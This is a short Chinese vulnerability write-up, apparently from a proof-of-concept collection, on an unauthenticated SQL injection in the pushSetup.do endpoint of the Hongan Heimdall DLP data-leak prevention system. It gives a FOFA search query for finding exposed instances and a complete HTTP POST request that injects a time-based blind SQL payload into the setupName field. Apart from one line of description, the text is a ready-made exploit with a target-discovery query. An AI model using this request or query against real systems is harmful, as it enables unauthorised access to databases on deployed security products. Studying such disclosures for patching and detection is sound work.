# 虹安DLP数据泄漏防护系统pushSetup.do存在SQL注入漏洞

虹安Heimdall DLP数据泄漏防护系统 pushSetup.do 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
body="userReg/initUserReg.do"
```

## poc
```javascript
POST /dlp/userReg/pushSetup.do HTTP/1.1
Host: 
Priority: u=4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

setupName={{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(5)))nxdq) AND 'vpUG'='vpUG)}}
```

![image-20241227223225696](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272232761.png)